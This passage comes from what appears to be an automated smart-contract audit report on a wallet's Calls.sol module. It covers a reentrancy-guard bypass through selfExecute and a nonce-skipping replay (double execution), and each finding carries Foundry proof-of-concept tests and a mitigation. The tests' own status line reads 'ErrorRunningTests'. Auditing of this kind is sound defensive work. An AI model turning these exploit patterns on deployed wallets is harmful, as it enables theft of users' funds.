6. State changes in the inner execution occur before the outer execution finishes.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Calls} from "src/modules/Calls.sol";
import {Payload} from "src/modules/Payload.sol";

// Mock Wallet to expose the vulnerability in Calls.sol
contract VulnerableWallet is Calls {
    address public hook;

    // Minimal overrides for abstract contract
    function signatureValidation(Payload.Decoded memory, bytes calldata) internal pure override returns (bool, bytes32) {
        return (true, bytes32(0));
    }
    function readNonce(uint256) public pure override returns (uint256) { return 0; }
    function _consumeNonce(uint256, uint256) internal {}
    function _isValidImage(bytes32) internal pure override returns (bool) { return true; }
    function _updateImageHash(bytes32) internal override {}

    function setHook(address _hook) external {
        hook = _hook;
    }

    // Simulation of a callback (like onERC721Received) that triggers a hook via delegatecall
    function onCallback() external {
        if (hook != address(0)) {
            (bool success, ) = hook.delegatecall(abi.encodeWithSignature("onHook()"));
            require(success, "Hook failed");
        }
    }

    // Ensure execute is exposed and uses the nonReentrant guard from Calls
    function execute(bytes calldata _payload, bytes calldata _signature) external payable override nonReentrant {
        super.execute(_payload, _signature);
    }

    // Helper to receive ETH if needed
    receive() external payable {}
}

contract ReentrantHook {
    bool public didReenter;

    function onHook() external {
        // Construct a minimal valid payload for selfExecute (0 calls)
        // GlobalFlag 0x01 (Space 0, No Nonce, Multiple Calls, Count Size 1 byte)
        // CallCount 0x00
        bytes memory payload = hex"0100";

        // Attempt to re-enter via selfExecute
        // If the vulnerability exists, this call succeeds. 
        // If fixed (nonReentrant added), this call will revert.
        try VulnerableWallet(payable(address(this))).selfExecute(payload) {
            didReenter = true;
        } catch {
            didReenter = false;
        }
    }
}

contract Trigger {
    // Contract to trigger the callback loop
    function run(address wallet) external {
        VulnerableWallet(payable(wallet)).onCallback();
    }
}

contract TestReentrancyBypass is Test {
    VulnerableWallet wallet;
    ReentrantHook hook;
    Trigger trigger;

    function setUp() public {
        wallet = new VulnerableWallet();
        hook = new ReentrantHook();
        trigger = new Trigger();
        wallet.setHook(address(hook));
    }

    function testBypassReentrancy() public {
        // Construct payload for wallet.execute -> trigger.run
        bytes memory callData = abi.encodeWithSelector(Trigger.run.selector, address(wallet));
        
        // Manual Payload Encoding: 
        // Global: 0x11 (Space 0 | Single Call)
        // Flag: 0x04 (Has Data)
        // Address: trigger
        // DataLen: 3 bytes (uint24)
        // Data: callData
        bytes memory payload = abi.encodePacked(
            uint8(0x11),
            uint8(0x04),
            address(trigger),
            uint24(callData.length),
            callData
        );

        // Execute the transaction
        wallet.execute(payload, "");

        // Assert that reentrancy occurred
        assertTrue(hook.didReenter(), "ReentrancyGuard was bypassed via selfExecute");
    }
}

## Suggested Mitigation
Apply the `nonReentrant` modifier to the `selfExecute` function in `Calls.sol`. This ensures that `selfExecute` cannot be called if the contract is already in an execution state (e.g., during `execute` or `executeUserOp`).





 **Derived From** : ERC4337 bundlers constructing UserOperations: Cross-Protocol Double Execution via Nonce Bypass in selfExecute

## [M-8]. Cross-Protocol Double Execution via Nonce Bypass in selfExecute

### Finding Severity Justification: The vulnerability allows for Cross-Protocol Double Execution (replay attack). A user's payload, containing a specific Sequence nonce, can be executed twice: once via the direct `execute` method (which consumes the nonce) and again via the ERC-4337 `executeUserOp` -> `selfExecute` path (which ignores the nonce). This violates the protocol's documented invariant of 'Strict Nonce Sequencing' and allows a payload to be re-executed out of order or duplicated if a user or client software broadcasts the transaction on both layers (e.g., due to retry logic or network congestion).
## Derived From Pattern/Invariant
ERC4337 bundlers constructing UserOperations: Cross-Protocol Double Execution via Nonce Bypass in selfExecute

## Exploit Type
ReplayAttack

## Location
Calls.selfExecute

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ERC4337v07.executeUserOp` function calls `selfExecute` to run the user's payload. `Calls.selfExecute` skips the `_consumeNonce` check (unlike `Calls.execute`). While ERC-4337 enforces its own nonce at the EntryPoint level, this design breaks the internal Sequence nonce invariant. If a user signs a payload P for direct execution (with Sequence nonce N) and also signs a UserOperation containing the same payload P (with EntryPoint nonce M), both can be executed. The direct execution consumes Sequence nonce N, but the 4337 execution ignores it, allowing the same payload to be executed twice.

## Impact
The vulnerability allows for Cross-Protocol Double Execution (replay attack), enabling a single authorized payload to be executed twice. A user's payload, containing a specific Sequence nonce, can be executed once via the direct `execute` method (which consumes the nonce) and again via the ERC-4337 `executeUserOp` -> `selfExecute` path (which ignores the nonce). This bypasses the protocol's 'Strict Nonce Sequencing' invariant, breaking the synchronization between the two execution modes and allowing double-spending or duplication of side-effects.

## Command to Run Test


## Proof of Concept
1. User constructs a payload P to transfer 10 USDC, using Sequence nonce 5.
2. User signs P for direct execution (`execute`).
3. User also signs a `UserOperation` containing P for 4337 execution.
4. Transaction 1: `execute(P)` mines. Sequence nonce 5 is consumed. 10 USDC sent.
5. Transaction 2: `handleOps` submits the UserOp. `executeUserOp` calls `selfExecute(P)`.
6. `selfExecute` does not check Sequence nonce 5. It executes P again. Another 10 USDC sent.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Calls} from "src/modules/Calls.sol";
import {ERC4337v07} from "src/modules/ERC4337v07.sol";
import {Payload} from "src/modules/Payload.sol";
import {Nonce} from "src/modules/Nonce.sol";

// Mock wallet to test the abstract Calls/ERC4337v07 logic
contract VulnerableWallet is Calls, ERC4337v07 {
    constructor(address _ep) ERC4337v07(_ep) {}

    // Implement abstract methods from BaseAuth/Implementation
    function _isValidImage(bytes32) internal pure override returns (bool) { return true; }
    function _updateImageHash(bytes32) internal override {}
    
    // Bypass signature check for simplicity in testing the nonce logic
    function signatureValidation(
        Payload.Decoded memory payload, 
        bytes calldata signature
    ) internal pure override returns (bool, bytes32) {
        return (true, Payload.hash(payload));
    }
}

contract TestDoubleExecution is Test {
    VulnerableWallet wallet;
    address entryPoint = address(0x123);
    
    event CallSucceeded(bytes32 _opHash, uint256 _index);

    function setUp() public {
        wallet = new VulnerableWallet(entryPoint);
    }

    function test_DoubleExecutionVia4337() public {
        // 1. Construct Payload: Space 0, Nonce 0, Single Call
        // Global Flag 0x11: Space=0 (bit0=1), NonceSize=0, SingleCall (bit4=1)
        bytes1 globalFlag = 0x11;
        // Call Flags 0x40: RevertOnError (bit6=1), rest 0
        bytes1 callFlags = 0x40;
        address target = address(0xCAFE);
        
        bytes memory payload = abi.encodePacked(
            globalFlag,
            callFlags,
            target
        );

        // 2. Execute via 4337 (selfExecute)
        // This SHOULD consume nonce 0 if secure, but doesn't in vulnerable code.
        vm.prank(entryPoint);
        wallet.executeUserOp(payload);

        // Check Nonce is still 0 (Vulnerability Confirmation)
        uint256 nonceAfter4337 = wallet.readNonce(0);
        assertEq(nonceAfter4337, 0, "Nonce should be 0 after vulnerable selfExecute");

        // 3. Execute via Direct Call
        // Since nonce is still 0, this succeeds, executing the payload a second time.
        bytes memory sig = hex"00"; // Dummy sig, mocked to pass
        wallet.execute(payload, sig);

        // Check Nonce is finally incremented
        uint256 nonceAfterDirect = wallet.readNonce(0);
        assertEq(nonceAfterDirect, 1, "Nonce should increment after execute");
    }
}

## Suggested Mitigation
Update `Calls.selfExecute` to explicitly consume the nonce encoded in the payload. This ensures that any payload executed via the ERC-4337 entrypoint increments the internal nonce, preventing it from being replayed via the direct execution path.

```solidity
  function selfExecute(
    bytes calldata _payload
  ) external payable virtual onlySelf {
    uint256 startingGas = gasleft();
    Payload.Decoded memory decoded = Payload.fromPackedCalls(_payload);

    // FIX: Consume nonce to enforce sequencing and prevent double execution
    _consumeNonce(decoded.space, decoded.nonce);

    bytes32 opHash = Payload.hash(decoded);
    _execute(startingGas, opHash, decoded);
  }
```



